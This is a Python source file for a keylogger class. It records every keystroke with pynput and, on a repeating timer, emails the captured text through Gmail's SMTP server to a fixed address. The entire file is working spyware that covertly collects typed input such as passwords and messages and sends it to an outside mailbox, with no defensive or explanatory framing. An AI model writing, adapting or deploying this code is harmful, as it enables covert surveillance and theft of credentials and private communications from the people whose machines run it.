from pynput import keyboard
import threading
import smtplib

class KeyLog:
    def __init__(self, val, e, p):
        self.buffer = ""
        self.interval = val
        self.email = e
        self.password = p

    def append_buffer(self, s):
        self.buffer+=s
    def process_key_press(self, key):
        try:
            cur = (str(key.char))
        except AttributeError:
            # attribute = `Key.Space`
            if key==key.space:
                cur = " "
            else:
                cur = "\n"+str(key)+"\n"
        self.append_buffer(cur)

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, "src@gmail.com", message)
        server.quit()
    def report(self):
        self.send_mail(self.email, self.password, "\n\n"+self.buffer) # \n\n to skip `subject` field
        self.buffer=""
        timer = threading.Timer(self.interval, self.report)
        # above creates a new thread while key_listener keeps running
        # the function is recursively executed with b/w interval
        timer.start()


    def run(self):
        #key_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard.Listener(on_press=self.process_key_press) as key_listener:
            self.report()
            key_listener.join()
